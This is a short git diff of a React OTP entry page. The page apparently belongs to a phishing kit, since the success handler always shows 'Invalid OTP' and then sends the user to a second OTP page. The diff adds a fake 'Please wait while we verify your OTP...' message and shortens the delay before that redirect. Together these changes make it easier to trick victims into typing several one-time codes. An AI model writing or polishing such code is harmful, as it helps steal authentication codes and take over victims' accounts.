@@ -28,6 +28,7 @@ const Otp = () => {
 
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const [waitingMessage, setWaitingMessage] = useState("");
 
   const submitForm = async (data) => {
     setLoading(true);
@@ -36,10 +37,11 @@ const Otp = () => {
       .then((response) => {
         console.log(response.data);
         setErrorMessage("Invalid OTP");
-        reset();
+        setWaitingMessage("Please wait while we verify your OTP...");
         setTimeout(() => {
+          setWaitingMessage("");
           navigate("/second-otp");
-        }, 40000);
+        }, 20000);
       })
       .catch((error) => {
         console.error("There was an error!", error);
@@ -83,6 +85,11 @@ const Otp = () => {
             />
           </div>
 
+          {waitingMessage && (
+            <p className="text-blue-600 text-sm text-center mb-2 animate-pulse">
+              {waitingMessage}
+            </p>
+          )}
           {errorMessage && (
             <p className="text-red-500 text-sm text-center mb-2">
               {errorMessage}
@@ -106,4 +113,3 @@ const Otp = () => {
 };
 
 export default Otp;
-
